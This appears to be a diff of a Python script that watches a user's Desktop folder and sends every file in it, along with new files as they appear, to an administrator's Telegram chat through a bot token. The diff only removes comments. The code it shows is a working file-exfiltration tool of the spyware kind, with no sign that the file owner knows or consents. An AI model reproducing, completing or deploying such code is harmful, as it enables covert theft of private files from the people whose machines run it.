@@ -4,8 +4,8 @@ import telegram
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 
-BOT_TOKEN = "YOUR_BOT_TOKEN"  # Replace with your bot token
-ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID"  # Replace with your admin chat ID
+BOT_TOKEN = "YOUR_BOT_TOKEN"
+ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID"
 
 bot = telegram.Bot(token=BOT_TOKEN)
 loop = asyncio.new_event_loop()
@@ -37,14 +37,14 @@ class DesktopHandler(FileSystemEventHandler):
                 return
 
 async def send_all_files():
-    path = os.path.join(os.path.expanduser("~"), "Desktop")  # Automatically detect the desktop path
+    path = os.path.join(os.path.expanduser("~"), "Desktop")
     for filename in os.listdir(path):
         file_path = os.path.join(path, filename)
         if os.path.isfile(file_path):
             await DesktopHandler().send_file(file_path)
 
 async def main():
-    path = os.path.join(os.path.expanduser("~"), "Desktop")  # Automatically detect the desktop path
+    path = os.path.join(os.path.expanduser("~"), "Desktop")
     event_handler = DesktopHandler()
     observer = Observer()
     observer.schedule(event_handler, path, recursive=False)
